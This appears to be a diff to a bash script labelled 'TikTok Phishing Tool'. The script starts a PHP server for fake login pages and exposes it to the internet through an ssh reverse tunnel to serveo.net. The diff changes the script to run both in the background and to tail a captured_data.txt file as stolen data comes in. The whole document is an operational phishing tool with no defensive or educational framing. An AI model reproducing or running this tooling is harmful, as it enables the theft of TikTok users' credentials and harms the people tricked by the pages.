@@ -7,7 +7,7 @@ killall ssh > /dev/null 2>&1
 clear
 echo "####################################"
 echo "#       TIKTOK PHISHING TOOL       #"
-echo "#        Created by Waseem Hacker  #"
+echo "#     Created by Waseem Hacker     #"
 echo "####################################"
 echo ""
 echo "[1] TikTok"
@@ -26,16 +26,17 @@ if [ $opt1 == 1 ]; then
     read -p "Select Server: " opt2
 
     if [ $opt2 == 1 ]; then
-        echo "[*] Starting Localhost..."
-        php -S 127.0.0.1:8080 -t pages/
-    elif [ $opt2 == 2 ]; then
-        echo "[*] Starting Server and Tunneling..."
         php -S 127.0.0.1:8080 -t pages/ > /dev/null 2>&1 &
-        ssh -R 80:127.0.0.1:8080 serveo.net
+    elif [ $opt2 == 2 ]; then
+        php -S 127.0.0.1:8080 -t pages/ > /dev/null 2>&1 &
+        ssh -R 80:127.0.0.1:8080 serveo.net > /dev/null 2>&1 &
     fi
 
-    echo "[*] Waiting for data..."
-    sleep 9999
+    clear
+    echo "####################################"
+    echo "#       WAITING FOR DATA...        #"
+    echo "####################################"
+    tail -f captured_data.txt
 
 elif [ $opt1 == 2 ]; then
     echo "Exiting..."
